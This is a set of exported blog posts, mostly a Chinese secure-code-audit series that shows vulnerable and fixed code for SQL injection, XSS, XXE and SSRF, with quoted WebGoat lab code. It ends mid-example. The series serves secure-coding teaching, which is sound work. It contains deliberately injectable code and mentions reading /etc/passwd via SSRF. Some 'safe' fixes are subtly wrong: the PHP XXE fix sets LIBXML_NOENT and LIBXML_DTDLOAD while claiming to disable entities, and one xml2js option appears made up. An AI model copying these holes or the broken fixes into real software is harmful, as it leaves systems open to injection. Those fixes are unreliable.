[{"title":"T-SEC Application Security Development","path":"/2025/01/22/appsec/xcheck/","content":"Xcheck https://xcheck.tencent.com/ Introduction to XcheckXcheck is a static application security testing (SAST) tool that aims to uncover hidden security risks in code and improve code security quality.Xcheck supports security checks in Go, Java, Nodejs, PHP, and Python. Vulnerabilities include SQL injection, code injection, command injection, cross-site scripting, deserialization vulnerability, and path traversal. In terms of framework support, xcheck has built-in coverage of common web frameworks. language frame Go Gin,Beego,Iris,net&#x2F;http,fastrouter,httprouter,go-restful,mux Java Spring,HttpServlet,WebService,jax-rs Nodejs Koa,Express PHP Thinkphp,Laravel,CodeIgniter,Yii,Yaf Python Django,Flask,Tornado,Webpy,Bottle,BaseHTTPServer Directions for useOn the Solution page, you can see that the Xcheck security rule package is enabled in the TCA Official Experience Analysis Solution. Go to the official scheme &gt; select the codebase for the analysis &gt; start the analysis.Note: Currently, Xcheck security rule packages can only be tried in the official experience analysis solution.imageimage T-SEC Application Security DevelopmentT-SEC Application Security DevelopmentApplication Security Development (codenamed Xcheck) provides you with high-quality code analysis services. With excellent algorithms and engineering implementations, Xcheck can find security vulnerabilities in the code at a very fast speed with a very low false positive and false negative rate. Product Features:Low false positives Xcheck is able to accurately understand the syntax characteristics of different languages, which basically solves the false positives caused by not understanding the code. In addition, Xcheck is able to identify user-defined security guards, further reducing false positives Low false negatives Xcheck already has a rich set of rules built into mainstream frameworks and risk functions; In addition, for unsupported frameworks and functions, you can supplement the corresponding recognition capabilities with custom rules. It’s fast Xcheck has a set of excellent code analysis algorithms, which solves the problem of low efficiency of traditional static analysis tools on the premise of ensuring accurate analysis. Compare editionsFunction SaaS test drive Privatized Deployment Edition Trial method WeChat login, online experience Contact a worker to apply for privatization testing Suitable for Personal Security Researcher&#x2F;Enterprise User Only applicable to corporate users Trial time No limit Contact staff to request a test authorization Number of scans There is a limit of 20 per account There is no limit to the number of times you can use the trial period Supported Languages Java&#x2F;Go&#x2F;Python&#x2F;PHP&#x2F;JavaScript Java&#x2F;Go&#x2F;Python&#x2F;PHP&#x2F;JavaScript&#x2F;C&#x2F;C++ Code source Only the platform can upload code compressed packages Support the platform to upload code compression packages; Git、SVN、FTP; Support integration into various DevOps platforms; Support integration into IDE tools in the form of plug-ins. Platform features Only task scanning and result viewing are supported Support task scanning and result viewing; Support project management capabilities; Support user organization structure setting and user role and authority management; Support rule customization and rule base management; Support statistical analysis; Support email, SMS, enterprise WeChat and defect management system docking; Support log management, device management, queue management, background configuration and other system settings","tags":["APPSEC","Xcheck","T-SEC"],"categories":["APPSEC"]},{"title":"MkDocs 配置谷歌统计和谷歌广告","path":"/2025/01/21/mkdocs/","content":"MkDocs配置 Google Analytics在配置文件 mkdocs.yml 中启用，并配置自己的 Google 代码。 1234extra: analytics: provider: google property: G-XXXXXXXXXX 查看自己的代码： 12345打开：https://analytics.google.com/需要点击十次才找到我的 Google 代码，“人性化设计”！！！【首页】 -&gt; 左下角【管理】 -&gt; 【数据收集与修改】 -&gt; 【数据流】 -&gt; 点选自己的【网站】 -&gt; 【配置代码设置】-&gt; 【数据流】 -&gt; 标签【管理】-&gt; 【添加此 Google 代码】 -&gt; 【手动添加】 配置 Google AdSense打开谷歌广告网站：https://www.google.com/adsense/ 点选【广告】-&gt; 点击【获取代码】-&gt; 完成 使用 extra_javascript 配置可以在 mkdocs.yml 文件中使用 extra_javascript 配置来引入 Google AdSense 脚本。 在你的 mkdocs.yml 中添加以下配置： 12extra_javascript: - https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-xxxxxxxxxxx 使用base文件配置123456789101112131415161718192021222324251. 定位 base.html 文件cd /usr/local/lib/python3.x/site-packages/mkdocs/themes/mkdocs2. 编辑 base.html 文件使用文本编辑器（如 vi 或 nano）打开并编辑 base.html 文件。vi base.html在 base.html 文件中找到 &lt;head&gt; 或 &lt;body&gt; 标签的位置，然后插入 Google AdSense 代码。建议将 Google AdSense 脚本代码放在 &#123;% block site_meta %&#125; 块内合适的位置。&#123;% block site_meta %&#125; &lt;!-- 之前的 meta 标签内容 --&gt; &lt;!-- Google AdSense Code --&gt; &lt;script async src=&quot;https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-xxxx&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;&#123;% endblock %&#125;3. 重新构建并部署保存文件后，使用 mkdocs build 重新构建你的站点，这样 Adsense 代码将被包含在你所有页面的 &lt;head&gt; 部分中。如果你不想修改 base.html 文件，可以通过 MkDocs 配置或 extra_javascript 来引入 Google AdSense 的广告脚本。 在文档中直接嵌入广告代码如果只想在特定页面显示广告，直接在 .md 文件中插入 AdSense 代码。 可以使用以下方式在文档中嵌入广告： 123456789101112&lt;!-- Google AdSense Code --&gt;&lt;script async src=&quot;https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-xxxx&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;&lt;ins class=&quot;adsbygoogle&quot; style=&quot;display:block&quot; data-ad-client=&quot;ca-pub-7114121088728794&quot; data-ad-slot=&quot;YOUR_AD_SLOT&quot; data-ad-format=&quot;auto&quot;&gt;&lt;/ins&gt;&lt;script&gt; (adsbygoogle = window.adsbygoogle || []).push(&#123;&#125;);&lt;/script&gt;","tags":["Wiki"],"categories":["基础工具"]},{"title":"SQL注入缺陷 - 腾讯安全代码审计实战系列01","path":"/2025/01/01/appsec/01-SQL注入缺陷/","content":"SQL注入缺陷 - 腾讯安全代码审计实战系列01SQL注入是网站存在最多也是最简单的漏洞，原因是应用程序在处理用户输入没有过滤, 转义, 限制或处理不严谨, 导致用户可以通过输入精心构造的字符串去非法获取到数据库中的数据。 危害如下: 获取敏感数据, 修改数据库数据(插入, 更新, 删除), 执行数据库管理操作(如关闭数据库管理系统)等 在某些情况下能执行系统命令, 进而直接获取数据库服务器的系统权限 修复建议 使用数据库预编译语句 (prepared statements) 或参数绑定，而不是直接将用户输入拼接到SQL查询中。这可以极大地减少SQL注入的风险。 对所有用户输入进行严格的验证和过滤，尤其是对于那些用于数据库查询的输入。删除或转义SQL语句中可能被用于注入攻击的特殊字符。 使用最新的库和API，确保使用具有内置防注入特性的数据库访问技术和框架。 4. 确保所有的数据库查询都使用一致的字符编码，推荐使用UTF-8，以避免由于编码不一致导致的安全漏洞。 示例代码Java代码示例： 123456789101112131415161718192021222324252627282930313233343536// bad：直接将用户输入拼接到SQL查询中，存在SQL注入的风险public void unsafeQuery(HttpServletRequest request, Connection connection) &#123; String custname = request.getParameter(&quot;name&quot;); String query = &quot;SELECT * FROM user_data WHERE user_name = &#x27;&quot; + custname + &quot;&#x27;&quot;; try &#123; Statement stmt = connection.createStatement(); ResultSet results = stmt.executeQuery(query); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125;&#125;// good：已提供的示例使用PreparedStatement防止SQL注入String custname = request.getParameter(&quot;name&quot;); String query = &quot;SELECT * FROM user_data WHERE user_name = ? &quot;;PreparedStatement pstmt = connection.prepareStatement(query);pstmt.setString(1, custname); ResultSet results = pstmt.executeQuery();// good：使用MyBatis的#&#123; &#125;占位符自动处理参数，避免SQL注入&lt;select id=&quot;queryRuleIdByApplicationId&quot; parameterType=&quot;java.lang.String&quot; resultType=&quot;java.lang.String&quot;&gt; select rule_id from scan_rule_sqlmap_tab where application_id=#&#123;applicationId&#125; &lt;/select&gt;// good：对用户输入进行严格的验证和过滤后使用PreparedStatementpublic void safeQueryWithValidation(HttpServletRequest request, Connection connection) &#123; String custname = request.getParameter(&quot;name&quot;).replaceAll(&quot;[^\\\\w\\\\s]&quot;, &quot;&quot;); // 过滤掉非字母数字的字符 String query = &quot;SELECT * FROM user_data WHERE user_name = ?&quot;; try &#123; PreparedStatement pstmt = connection.prepareStatement(query); pstmt.setString(1, custname); ResultSet results = pstmt.executeQuery(); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125;&#125; Go代码示例： 123456789101112// bad: 直接将用户输入拼接到SQL查询中，存在SQL注入的风险func vulnerableHandler(db *sql.DB, req *http.Request) &#123; query := fmt.Sprintf(&quot;SELECT ITEM, PRICE FROM PRODUCT WHERE ITEM_CATEGORY=&#x27;%s&#x27; ORDER BY PRICE&quot;, req.URL.Query().Get(&quot;category&quot;)) db.Query(query)&#125;// good: 使用预编译语句和参数绑定，防止SQL注入func safeHandler(db *sql.DB, req *http.Request) &#123; query := &quot;SELECT ITEM, PRICE FROM PRODUCT WHERE ITEM_CATEGORY=? ORDER BY PRICE&quot; db.Query(query, req.URL.Query().Get(&quot;category&quot;))&#125; PHP代码示例： 12345678910111213141516171819// bad：未使用参数绑定方式执行SQL查询$id = $_GET[&#x27;id&#x27;];$sql = &quot;SELECT * FROM pages WHERE id = $id&quot;;$result = $mysql-&gt;query($sql);// good: 使用PDO，基于参数绑定的方式执行SQL语句$sth = $dbh-&gt;prepare(&#x27;SELECT name, colour, calories FROM fruit WHERE calories &lt; ? AND colour = ?&#x27;);$sth-&gt;execute(array(150, &#x27;red&#x27;));$red = $sth-&gt;fetchAll();// good: 使用PDO，基于参数绑定的方式执行SQL语句$sql = &#x27;SELECT name, colour, calories FROM fruit WHERE calories &lt; :calories AND colour = :colour&#x27;;$sth = $dbh-&gt;prepare($sql, array(PDO::ATTR_CURSOR =&gt; PDO::CURSOR_FWDONLY));$sth-&gt;execute(array(&#x27;:calories&#x27; =&gt; 150, &#x27;:colour&#x27; =&gt; &#x27;red&#x27;));$red = $sth-&gt;fetchAll(); Python代码示例： 12345678910111213141516171819202122232425262728293031323334353637383940414243# bad：直接通过字符串格式化将用户输入拼接到SQL查询中，存在SQL注入风险import mysql.connectormydb = mysql.connector.connect( ... ...)cur = mydb.cursor()userid = get_id_from_user()cur.execute(&quot;SELECT `id`, `password` FROM `auth_user` WHERE `id`=&#x27;%s&#x27;&quot; % userid) # 前后添加引号，查询仍然危险myresult = cur.fetchall()# good：使用参数化查询方式，避免SQL注入import mysql.connectormydb = mysql.connector.connect( ... ...)cur = mydb.cursor()userid = get_id_from_user()# 使用参数化查询，用户输入作为查询参数cur.execute(&quot;SELECT `id`, `password` FROM `auth_user` WHERE `id`=%s&quot;, (userid,))myresult = cur.fetchall()# good：增加输入验证，确保用户输入格式正确import mysql.connectorimport redef safe_get_id_from_user(): userid = get_id_from_user() if not re.match(r&quot;^\\d+$&quot;, userid): raise ValueError(&quot;Invalid user ID format&quot;) return useridmydb = mysql.connector.connect( ... ...)cur = mydb.cursor()userid = safe_get_id_from_user()cur.execute(&quot;SELECT `id`, `password` FROM `auth_user` WHERE `id`=%s&quot;, (userid,))myresult = cur.fetchall() JavaScript代码示例： 1234567891011121314151617181920// bad：拼接SQL语句查询，存在安全风险const mysql = require(&quot;mysql&quot;);const connection = mysql.createConnection(options);connection.connect();const sql = util.format(&quot;SELECT * from some_table WHERE Id = %s and Name = %s&quot;, req.body.id, req.body.name);connection.query(sql, (err, result) =&gt; &#123; // handle errors...&#125;); // good：使用预编译绑定变量构造SQL语句const mysql = require(&quot;mysql&quot;);const connection = mysql.createConnection(options);connection.connect();const sql = &quot;SELECT * from some_table WHERE Id = ? and Name = ?&quot;;const sqlParams = [req.body.id, req.body.name];connection.query(sql, sqlParams, (err, result) =&gt; &#123; // handle errors...&#125;); WebGoat-main&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;owasp&#x2F;webgoat&#x2F;lessons&#x2F;challenges&#x2F;challenge5&#x2F;Assignment5.java 12345678910111213141516171819202122232425262728293031323334353637383940414243/*Assignment5.java:52 username_login是污点来源Assignment5.java:61 污点从username_login传递至statementAssignment5.java:68 SQL注入类型风险触发，由入参statement导致*/package org.owasp.webgoat.lessons.challenges.challenge5;@RestController@Slf4j@RequiredArgsConstructorpublic class Assignment5 implements AssignmentEndpoint &#123; private final LessonDataSource dataSource; private final Flags flags; @PostMapping(&quot;/challenge/5&quot;) @ResponseBody public AttackResult login( @RequestParam String username_login, @RequestParam String password_login) throws Exception &#123; if (!StringUtils.hasText(username_login) || !StringUtils.hasText(password_login)) &#123; return failed(this).feedback(&quot;required4&quot;).build(); &#125; if (!&quot;Larry&quot;.equals(username_login)) &#123; return failed(this).feedback(&quot;user.not.larry&quot;).feedbackArgs(username_login).build(); &#125; try (var connection = dataSource.getConnection()) &#123; PreparedStatement statement = connection.prepareStatement( &quot;select password from challenge_users where userid = &#x27;&quot; + username_login + &quot;&#x27; and password = &#x27;&quot; + password_login + &quot;&#x27;&quot;); ResultSet resultSet = statement.executeQuery(); if (resultSet.next()) &#123; return success(this).feedback(&quot;challenge.solved&quot;).feedbackArgs(flags.getFlag(5)).build(); &#125; else &#123; return failed(this).feedback(&quot;challenge.close&quot;).build(); &#125; &#125; &#125;&#125;","tags":["安全开发","应用安全"],"categories":["安全开发"]},{"title":"反射型跨站脚本缺陷 - 腾讯安全代码审计实战系列02","path":"/2025/01/01/appsec/02-反射型跨站脚本/","content":"反射型跨站脚本缺陷 - 腾讯安全代码审计实战系列02反射型跨站脚本（XSS）是一种常见的Web安全漏洞，主要由于Web应用程序对用户输入缺乏适当的验证和编码。当攻击者成功将恶意脚本注入到网页中时，这些脚本会在未经授权的情况下被执行，可能导致以下危害： 1. 网络钓鱼，包括盗取用户账户信息。 2. 窃取用户的Cookies和其他敏感会话数据。 3. 劫持用户会话，获取用户身份。 4. 强制弹出广告页面或进行流量劫持。 该漏洞常现于Web应用程序直接返回用户输入的情形。当用户访问受影响的链接时，恶意代码会被反射并在用户浏览器中执行。 修复建议 在输出所有用户可控的数据时，对数据进行HTML转义或编码，以防止恶意代码执行。 2. 使用安全的库或方法进行HTML编码，例如ASP.NET的AntiXSS库或System.Web.Security.AntiXss.AntiXssEncoder.HtmlEncode方法。 3. 对所有用户输入进行验证，确保仅包含预期内容，避免任何HTML标签或JavaScript代码被接受。 4. 实施内容安全策略（CSP）以限制浏览器执行的资源，从而减少XSS攻击面。 示例代码1234567891011121314151617181920212223242526272829303132using Microsoft.AspNetCore.Http;using System.Text.Encodings.Web;/// bad：直接将用户输入传递给WriteAsync方法，没有进行HTML编码，容易引发XSS攻击public async Task DisplayEmployeeIDAsync(HttpContext context) &#123; string userInput = context.Request.Query[&quot;id&quot;]; await context.Response.WriteAsync(userInput); // 用户输入直接输出到响应中，未进行任何处理&#125;/// good：使用HtmlEncoder.Default.Encode方法对用户输入进行HTML编码public async Task DisplayEmployeeIDAsyncSecure(HttpContext context) &#123; string userInput = context.Request.Query[&quot;id&quot;]; string safeOutput = HtmlEncoder.Default.Encode(userInput); // 使用HtmlEncoder进行HTML编码 await context.Response.WriteAsync(safeOutput);&#125;/// good：验证用户输入，确保输入内容不包含非法字符public async Task DisplayEmployeeIDWithValidationAsync(HttpContext context) &#123; string userInput = context.Request.Query[&quot;id&quot;]; if (IsValidInput(userInput)) &#123; // 自定义的IsValidInput方法来验证输入 string safeOutput = HtmlEncoder.Default.Encode(userInput); await context.Response.WriteAsync(safeOutput); &#125; else &#123; // 处理非法输入，例如提示错误 await context.Response.WriteAsync(&quot;Invalid input detected.&quot;); &#125;&#125;private bool IsValidInput(string input) &#123; // 检查输入是否仅包含允许的字符 return !string.IsNullOrEmpty(input) &amp;&amp; input.All(c =&gt; char.IsLetterOrDigit(c));&#125;","tags":["安全开发","应用安全"],"categories":["安全开发"]},{"title":"XML外部实体缺陷 - 腾讯安全代码审计实战系列03","path":"/2025/01/01/appsec/03-XML外部实体缺陷/","content":"XML外部实体缺陷 - 腾讯安全代码审计实战系列03XML用于标记电子文件使其具有结构性的标记语言, 可以用来标记数据, 定义数据类型, 是一种允许用户对自己的标记语言进行定义的源语言. XML文档结构包括XML声明, DTD文档类型定义(可选), 文档元素. DTD的作用是定义XML文档的合法构建模块, DTD可以在XML文档内声明, 也可以外部引用. 当应用程序允许XML引用外部实体时, 通过构造恶意内容, 可导致XXE漏洞。 危害如下: 1. 读取任意文件 2. 执行系统命令 3. 探测内网端口 4. 攻击内网网站 修复建议 使用开发语言提供的禁用外部实体的方法。确保在解析XML前禁用DTD（文档类型定义）和禁止外部实体的解析。 过滤用户提交的XML数据，特别是对于嵌入XML或DTD的输入，进行严格的验证和过滤，确保它们不包含对外部实体或不安全的结构的引用。 示例代码Java代码示例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// bad：直接解析未经过滤或检查的XML字符串@RequestMapping(&quot;/xxe&quot;)public void test(String xmlstr) throws IOException &#123; DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); try &#123; InputStream is = new ByteArrayInputStream(xmlstr.getBytes()); DocumentBuilder builder = factory.newDocumentBuilder(); builder.parse(is); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125;&#125;// good：禁用外部实体和DTD，防止XXE@RequestMapping(&quot;/no_xxe&quot;)public void test(String xmlstr) throws IOException &#123; DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); try &#123; // 禁用DTD、禁止外部实体解析 factory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); factory.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false); factory.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false); InputStream is = new ByteArrayInputStream(xmlstr.getBytes()); DocumentBuilder builder = factory.newDocumentBuilder(); builder.parse(is); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125;&#125;// good：在解析XML前对XML内容进行验证和过滤@RequestMapping(&quot;/validate_xxe&quot;)public void validateAndParse(String xmlstr) throws IOException &#123; DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance(); try &#123; if (!isValidXML(xmlstr)) &#123; // 假设isValidXML为自定义方法，用于检查XML的安全性 throw new IOException(&quot;Invalid XML content.&quot;); &#125; factory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); factory.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false); factory.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false); InputStream is = new ByteArrayInputStream(xmlstr.getBytes()); DocumentBuilder builder = factory.newDocumentBuilder(); builder.parse(is); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125;&#125; Go代码示例： 1234567891011121314151617181920212223//bad: 使用默认的XML解析器，未禁用外部实体解析func unsafeParseXML(data []byte) &#123; xmlReader := bytes.NewReader(data) decoder := xml.NewDecoder(xmlReader) var target interface&#123;&#125; if err := decoder.Decode(&amp;target); err != nil &#123; log.Println(&quot;Error decoding XML:&quot;, err) &#125;&#125;//good: 明确禁用DTD和外部实体解析func safeParseXML(data []byte) &#123; xmlReader := bytes.NewReader(data) decoder := xml.NewDecoder(xmlReader) decoder.Strict = false decoder.Entity = nil var target interface&#123;&#125; if err := decoder.Decode(&amp;target); err != nil &#123; log.Println(&quot;Error decoding XML:&quot;, err) &#125;&#125; PHP代码示例： 1234567891011121314151617// bad：未禁用外部实体加载，容易受到XXE攻击function unsafeXMLParse($xmlContent) &#123; $xml = simplexml_load_string($xmlContent); // 这里没有禁用实体加载 // 假设进行一些基于$xml的处理&#125;// good：加载XML前，禁用实体解析libxml_disable_entity_loader(true);$xml = simplexml_load_string($xmlContent);// good：通过DOMDocument禁用外部实体，增加安全性function safeXMLParse($xmlContent) &#123; libxml_disable_entity_loader(true); // 禁用外部实体加载 $dom = new DOMDocument(); $dom-&gt;loadXML($xmlContent, LIBXML_NOENT | LIBXML_DTDLOAD); // 明确禁用DTD加载和外部实体 // 假设进行一些基于$dom的处理&#125; Python代码示例： 123456789101112131415161718192021222324252627282930313233# bad：允许外部实体，可能导致XXE攻击from xml.etree.ElementTree import parsedef unsafe_parse_xml(xml_file): # 这种方式没有禁用外部实体 tree = parse(xml_file) root = tree.getroot() return root# bad：错误的配置解析器，未禁用外部实体from lxml import etreedef incorrect_parse_xml(xml_file): parser = etree.XMLParser() # 默认情况允许外部实体 tree = etree.parse(xml_file, parser) root = tree.getroot() return root# good：禁用外部实体from lxml import etreedef safe_parse_xml(xml_file): # 配置解析器以禁用外部实体 parser = etree.XMLParser(resolve_entities=False) tree = etree.parse(xml_file, parser) root = tree.getroot() return root# good 禁用外部实体from lxml import etreedef parse_xml(xmlSource): xmlData = etree.parse(xmlSource, etree.XMLParser(resolve_entities=False)) return xmlData.getroot() JavaScript代码示例： 123456789101112131415161718192021222324252627282930313233const xml2js = require(&#x27;xml2js&#x27;);const fs = require(&#x27;fs&#x27;);//bad：未禁用外部实体，可能导致XXE攻击function unsafeParseXML(xmlData) &#123; const parser = new xml2js.Parser(); // 默认情况下可能允许外部实体 parser.parseString(xmlData, (err, result) =&gt; &#123; console.log(result); &#125;);&#125;//good：禁用外部实体和DTDfunction safeParseXML(xmlData) &#123; const parser = new xml2js.Parser(&#123; explicitRoot: false, // 不解析根节点 ignoreAttrs: true, // 不解析属性 explicitArray: false, // 不强制数组输出 dtd: &#123; external: false // 禁止加载外部DTD &#125; &#125;); parser.parseString(xmlData, (err, result) =&gt; &#123; if (err) &#123; console.error(&quot;Failed to parse XML:&quot;, err); return; &#125; console.log(&quot;Safely parsed XML:&quot;, result); &#125;);&#125;const xmlData = fs.readFileSync(&#x27;example.xml&#x27;, &#x27;utf8&#x27;);unsafeParseXML(xmlData);safeParseXML(xmlData); WebGoat-main&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;owasp&#x2F;webgoat&#x2F;lessons&#x2F;xxe&#x2F;CommentsCache.java 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980/*SimpleXXE.java:68 commentStr是污点来源SimpleXXE.java:72 污点commentStr传入方法parseXml(String, boolean)CommentsCache.java:86 parseXml(String, boolean)方法的xml参数为污点CommentsCache.java:97 XML外部实体类型风险触发，由入参xml导致*/@Component@Scope(&quot;singleton&quot;)public class CommentsCache &#123; static class Comments extends ArrayList&lt;Comment&gt; &#123; void sort() &#123; sort(Comparator.comparing(Comment::getDateTime).reversed()); &#125; &#125; private static final Comments comments = new Comments(); private static final Map&lt;WebGoatUser, Comments&gt; userComments = new HashMap&lt;&gt;(); private static final DateTimeFormatter fmt = DateTimeFormatter.ofPattern(&quot;yyyy-MM-dd, HH:mm:ss&quot;); public CommentsCache() &#123; initDefaultComments(); &#125; void initDefaultComments() &#123; comments.add(new Comment(&quot;webgoat&quot;, LocalDateTime.now().format(fmt), &quot;Silly cat....&quot;)); comments.add( new Comment( &quot;guest&quot;, LocalDateTime.now().format(fmt), &quot;I think I will use this picture in one of my projects.&quot;)); comments.add(new Comment(&quot;guest&quot;, LocalDateTime.now().format(fmt), &quot;Lol!! :-).&quot;)); &#125; protected Comments getComments(WebGoatUser user) &#123; Comments allComments = new Comments(); Comments commentsByUser = userComments.get(user); if (commentsByUser != null) &#123; allComments.addAll(commentsByUser); &#125; allComments.addAll(comments); allComments.sort(); return allComments; &#125; protected Comment parseXml(String xml, boolean securityEnabled) throws XMLStreamException, JAXBException &#123; var jc = JAXBContext.newInstance(Comment.class); var xif = XMLInputFactory.newInstance(); // TODO fix me disabled for now. if (securityEnabled) &#123; xif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, &quot;&quot;); // Compliant xif.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, &quot;&quot;); // compliant &#125; var xsr = xif.createXMLStreamReader(new StringReader(xml)); var unmarshaller = jc.createUnmarshaller(); return (Comment) unmarshaller.unmarshal(xsr); &#125; public void addComment(Comment comment, WebGoatUser user, boolean visibleForAllUsers) &#123; comment.setDateTime(LocalDateTime.now().format(fmt)); comment.setUser(user.getUsername()); if (visibleForAllUsers) &#123; comments.add(comment); &#125; else &#123; var comments = userComments.getOrDefault(user.getUsername(), new Comments()); comments.add(comment); userComments.put(user, comments); &#125; &#125; public void reset(WebGoatUser user) &#123; comments.clear(); userComments.remove(user); initDefaultComments(); &#125;&#125;","tags":["安全开发","应用安全"],"categories":["安全开发"]},{"title":"SSRF服务端请求伪造缺陷 - 腾讯安全代码审计实战系列04","path":"/2025/01/01/appsec/04-SSRF服务端请求伪造/","content":"SSRF服务端请求伪造缺陷 - 腾讯安全代码审计实战系列04SSRF（Server-Side Request Forgery）服务端请求伪造是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。 一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。 恶意用户可以利用此漏洞: 内网, 本地端口扫描, 获取开放端口信息 主机信息收集, web应用指纹识别, 获取服务banner信息 根据识别出的应用针对性的发送payload攻击, 例如struts2 攻击内网和本地的应用程序及服务 穿越防火墙 利用file协议读取本地文件, 比如file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd 修复建议 限制请求的端口为HTTP常用的端口，比如80, 443, 8080, 8090。这可以防止通过不常用端口发起的恶意请求。 使用黑名单策略禁止内网IP地址，防止应用被用来获取内网数据或攻击内网。 禁用不需要的协议，仅允许HTTP和HTTPS请求。这可以阻止通过如file:&#x2F;&#x2F;&#x2F;, gopher:&#x2F;&#x2F;, ftp:&#x2F;&#x2F;等协议引起的安全问题。 对所有外部请求的URL进行严格的验证，确保只允许请求到预定义的安全域名或路径。 示例代码Java代码示例： 123456789101112131415161718192021222324252627282930// bad：直接从用户输入获取URL并打开连接，没有进行任何验证，存在SSRF风险@RequestMapping(&quot;/ssrf&quot;)public void test(String str) throws IOException &#123; URL u = new URL(str); HttpURLConnection conn = (HttpURLConnection) u.openConnection(); // SSRF风险&#125;// good：限制只能访问特定域名@RequestMapping(&quot;/safe_ssrf&quot;)public void test(String str) throws IOException &#123; URL u = new URL(str); // .oa.com是一个可信的域名，可信域名根据具体业务而定 if (u.getHost().endsWith(&quot;.oa.com&quot;)) &#123; HttpURLConnection conn = (HttpURLConnection) u.openConnection(); &#125;&#125;// good：检查并阻止内网IP地址@RequestMapping(&quot;/safe_ssrf&quot;)public void test(String str) throws IOException &#123; URL u = new URL(str); String host = u.getHost(); InetAddress inet = InetAddress.getByName(host); String ip = inet.getHostAddress(); // isInternalIp方法自己实现，判断该url对应的ip地址是否安全 if (!isInternalIp(ip)) &#123; HttpURLConnection conn = (HttpURLConnection) u.openConnection(); conn.setFollowRedirects(false); &#125;&#125; Go代码示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// bad：直接从用户输入获取URL并发起请求，未进行任何安全检查func handleBadSSRF(w http.ResponseWriter, r *http.Request) &#123;\tuserURL := r.URL.Query().Get(&quot;url&quot;)\tresp, err := http.Get(userURL) // SSRF风险\tif err != nil &#123; http.Error(w, &quot;Failed to make request&quot;, http.StatusInternalServerError) return\t&#125;\tdefer resp.Body.Close()\t// ...处理响应...&#125;// good：限制只能访问特定域名func handleGoodSSRFDomain(w http.ResponseWriter, r *http.Request) &#123;\tuserURL := r.URL.Query().Get(&quot;url&quot;)\tparsedURL, err := url.Parse(userURL)\tif err != nil &#123; http.Error(w, &quot;Invalid URL&quot;, http.StatusBadRequest) return\t&#125;\tif parsedURL.Hostname() == &quot;example.com&quot; &#123; resp, err := http.Get(userURL) if err != nil &#123; http.Error(w, &quot;Failed to make request&quot;, http.StatusInternalServerError) return &#125; defer resp.Body.Close() // ...处理响应...\t&#125;&#125;// good：禁用非HTTP/HTTPS协议，检查并阻止内网IP地址func handleGoodSSRFSecure(w http.ResponseWriter, r *http.Request) &#123;\tuserURL := r.URL.Query().Get(&quot;url&quot;)\tparsedURL, err := url.Parse(userURL)\tif err != nil || (parsedURL.Scheme != &quot;http&quot; &amp;&amp; parsedURL.Scheme != &quot;https&quot;) &#123; http.Error(w, &quot;Unsupported protocol&quot;, http.StatusBadRequest) return\t&#125;\t// 这里应当有更多的IP验证逻辑\tresp, err := http.Get(userURL)\tif err != nil &#123; http.Error(w, &quot;Failed to make request&quot;, http.StatusInternalServerError) return\t&#125;\tdefer resp.Body.Close()\t// ...处理响应...&#125; PHP代码示例： 1234567891011121314151617181920212223242526272829303132333435363738394041//bad：直接从用户输入获取URL并使用file_get_contents，没有进行任何验证，存在SSRF风险function badSSRF($url) &#123; $data = file_get_contents($url); // 可能会被用来访问内网或敏感文件 echo $data;&#125;//good：限制只能访问特定域名function goodSSRFDomain($url) &#123; $parsedUrl = parse_url($url); $hostname = $parsedUrl[&#x27;host&#x27;]; if ($hostname == &quot;example.com&quot;) &#123; $data = file_get_contents($url); echo $data; &#125; else &#123; echo &quot;Access denied.&quot;; &#125;&#125;//good：检查并阻止内网IP地址function goodSSRFCheckIp($url) &#123; $parsedUrl = parse_url($url); $ip = gethostbyname($parsedUrl[&#x27;host&#x27;]); if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123; $data = file_get_contents($url); echo $data; &#125; else &#123; echo &quot;Internal IP detected. Access denied.&quot;; &#125;&#125;//good：限制请求使用的端口function goodSSRFPort($url) &#123; $parsedUrl = parse_url($url); $port = isset($parsedUrl[&#x27;port&#x27;]) ? $parsedUrl[&#x27;port&#x27;] : 80; // 默认端口80 if (in_array($port, [80, 443, 8080])) &#123; $data = file_get_contents($url); echo $data; &#125; else &#123; echo &quot;Invalid port. Access denied.&quot;; &#125;&#125; Python代码示例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# bad：直接从用户输入获取URL并使用requests库打开连接，没有进行任何验证，存在SSRF风险from flask import Flask, requestimport requestsapp = Flask(__name__)@app.route(&#x27;/ssrf&#x27;)def test(): url = request.args.get(&#x27;url&#x27;) response = requests.get(url) # 高风险的SSRF点 return response.text# good：限制只能访问特定域名@app.route(&#x27;/safe_ssrf&#x27;)def safe_test(): url = request.args.get(&#x27;url&#x27;) parsed_url = urlparse(url) if parsed_url.hostname.endswith(&#x27;.oa.com&#x27;): response = requests.get(url) return response.text else: 